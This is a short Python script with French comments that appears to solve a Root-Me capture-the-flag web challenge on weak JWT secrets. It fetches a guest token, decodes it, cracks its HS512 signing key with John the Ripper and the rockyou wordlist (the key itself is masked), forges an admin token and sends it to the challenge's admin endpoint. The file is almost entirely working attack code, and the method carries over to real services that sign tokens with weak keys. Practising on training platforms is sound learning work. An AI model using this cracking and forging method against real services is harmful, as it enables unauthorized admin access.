import requests
import jwt


r=requests.get("http://challenge01.root-me.org/web-serveur/ch59/hello") # Le message normal

r=requests.get("http://challenge01.root-me.org/web-serveur/ch59/token") # Le token :)


print(r.text) 

# eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9 => {"alg":"HS512","typ":"JWT"}
# eyJyb2xlIjoiZ3Vlc3QifQ =>  {"role":"guest"}
# 4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw => le petit secret : 

# john catjwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA512 => *** => Je donne pas le secret


MonJTW = jwt.encode({"role": "admin"}, '***', algorithm='HS512')


r=requests.post('http://challenge01.root-me.org/web-serveur/ch59/admin')
print(r.text)

header={'Authorization': 'Bearer '+MonJTW}

r=requests.post('http://challenge01.root-me.org/web-serveur/ch59/admin',headers=header)
print(r.text)
